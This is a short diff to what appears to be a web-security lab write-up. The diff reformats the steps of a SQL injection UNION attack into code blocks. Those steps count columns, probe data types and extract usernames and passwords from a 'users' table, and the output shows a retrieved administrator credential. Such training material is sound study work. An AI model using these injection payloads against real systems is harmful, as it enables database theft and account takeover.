@@ -13,17 +13,26 @@ To solve the lab, perform a SQL injection UNION attack that retrieves all userna
 
 1/ Determine the number of columns
 
+```sql
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
+```
 
 
 2/ Determine the data type of columns
 
+```sql
 ' UNION SELECT 111, 'AAA'--
+```
 
 
 3/ Determine the data from the table "users" and the columns "username" and "password"
 
+```sql
 ' UNION SELECT NULL, username || '~' || password FROM users--
-        administrator~27igwv8c5mhp6cmx44hd
+```
+
+```text
+administrator~27igwv8c5mhp6cmx44hd
+```
 
